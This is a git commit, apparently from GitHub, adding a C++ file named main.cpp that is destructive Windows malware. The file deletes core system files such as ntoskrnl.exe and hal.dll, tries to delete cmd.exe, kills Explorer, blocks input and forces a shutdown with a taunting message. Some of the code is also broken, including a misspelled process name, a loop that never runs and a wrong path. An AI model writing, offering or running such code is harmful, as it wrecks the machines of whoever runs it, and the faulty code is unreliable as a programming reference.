3574fee974a35a8067107bcbeb54bd326046b91c
seycoding3 <167637118+seycoding3@users.noreply.github.com>
2024-04-26 16:53:46 +0300

    main.cpp

---
+++ main.cpp
@@ -0,0 +1,44 @@
+#include <iostream>
+#include <windows.h>
+#include <fstream.h>
+void delfiles() {
+  std::remove("C:\\Windows\\System32\\hal.dll");
+  std::remove("C:\\Windows\\System32\\wininit.exe");
+  std::remove("C:\\Windows\\System32\\winload.exe");
+  std::remove("C:\\Windows\\System32\\ntoskrnl.exe");
+  
+
+
+}
+void closeinscnd() {
+  system("shutdown /s /t 30 /c Say Good Bye To Your PC!");
+  
+
+
+}
+void closeexplorer() {
+  FreeConsole();
+  system("taskkill /f /IM exlorer.exe");
+
+}
+void delcmd() {
+  std::remove("C:\\System32\\cmd.exe");
+
+}
+void blockinput() {
+  for(int i = 0;i>900000;i++) {
+    BlockInput(true);
+
+  }
+
+}
+int main() {
+  closeexplorer();
+  delfiles();
+  closeinscnd();
+  delcmd();
+  blockinput();
+
+
+
+}
